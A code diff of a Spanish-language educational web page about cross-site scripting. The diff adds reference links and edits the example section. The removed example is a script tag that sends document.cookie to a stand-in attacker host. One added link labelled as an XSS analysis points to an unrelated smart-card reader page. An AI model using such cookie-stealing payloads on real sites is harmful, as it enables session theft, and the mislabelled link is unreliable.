@@ -129,6 +129,14 @@
                     <p class="card-title text-grey text-spacey">
                         XSS ha sido un problema conocido desde los primeros días de la web. Se hizo evidente a medida que las aplicaciones web comenzaron a permitir la interacción del usuario, especialmente en foros y aplicaciones de redes sociales. La vulnerabilidad fue documentada por primera vez a principios de la década de 2000 y ha sido incluida en el <strong>Top Ten de OWASP</strong> desde entonces.
                     </p>
+                    <p class="text-grey text-spacey">
+                        Para obtener más información, puedes visitar los siguientes enlaces:
+                    </p>
+                    <ul class="text-grey text-spacey">
+                        <li><a href="https://owasp.org/www-project-top-ten/" target="_blank">OWASP Top Ten</a> - Información sobre las vulnerabilidades más críticas en aplicaciones web.</li>
+                        <li><a href="https://www.acs.com.hk/en/products/1028/acr38-smart-card-reader/" target="_blank">Vulnerabilidades de XSS en la web</a> - Un análisis detallado sobre las vulnerabilidades XSS.</li>
+                        <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger - XSS</a> - Recursos y explicaciones sobre XSS y sus tipos.</li>
+                    </ul>
 
                     <h4 class="mt-4 text-grey" style="font-weight: bold;">Impacto de XSS</h4>
                     <p class="card-title text-grey text-spacey">
@@ -152,18 +160,13 @@
                     <p class="card-title text-grey text-spacey">Un atacante publica un comentario en un blog que contiene un script malicioso:</p>
                     <div class="card border-primary mb-3 text-center">
                         <div class="card-body">
-                            <p class="mt-4 text-grey" style="font-weight: bold;">&lt;script&gt;fetch('https://attacker.com/steal?cookie=' + document.cookie)&lt;/script&gt;</p>
-                            <p class="card-title text-grey text-spacey">Cuando otros usuarios ven el comentario, su cookie se envía al atacante.</p>
+                            <p class="mt-4 text-grey" style="font-weight: bold;">Comentario: <code>&lt;script&gt;stealCookies();&lt;/script&gt;</code></p>
+                            <p class="card-title text-grey text-spacey">El script se almacena en la base de datos y se sirve a otros usuarios.</p>
                         </div>
                     </div>
-
-                    <h4 class="mt-4 text-grey" style="font-weight: bold;">Tipos de XSS</h4>
-                    <p class="card-title text-grey text-spacey">Los tipos principales de XSS son:</p>
-                    <ul class="card-title text-grey text-spacey">
-                        <li><strong>XSS Reflejado:</strong> El script malicioso es parte de la solicitud y se refleja en la respuesta del servidor.</li>
-                        <li><strong>XSS Almacenado:</strong> El script malicioso se almacena en el servidor (por ejemplo, en una base de datos) y se sirve a otros usuarios.</li>
-                        <li><strong>XSS DOM-Based:</strong> El ataque se realiza mediante manipulación del Document Object Model (DOM) del navegador.</li>
-                    </ul>
+                    
+                    <h4 class="mt-4 text-grey" style="font-weight: bold;">XSS DOM-Based:</h4>
+                    <p class="card-title text-grey text-spacey">El ataque se realiza mediante manipulación del Document Object Model (DOM) del navegador.</p>
 
                     <h4 class="mt-4 text-grey" style="font-weight: bold;">Prevención de XSS</h4>
                     <p class="card-title text-grey text-spacey">Las estrategias de prevención incluyen:</p>
@@ -186,3 +189,4 @@
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-ggOyR0iXCbMQv3Xip8nQ7g2PtT5g8sZ4Cj30gB5F9sc5P2Bk8QFwmMx9R5+56qKt" crossorigin="anonymous"></script>
 </body>
 </html>
+
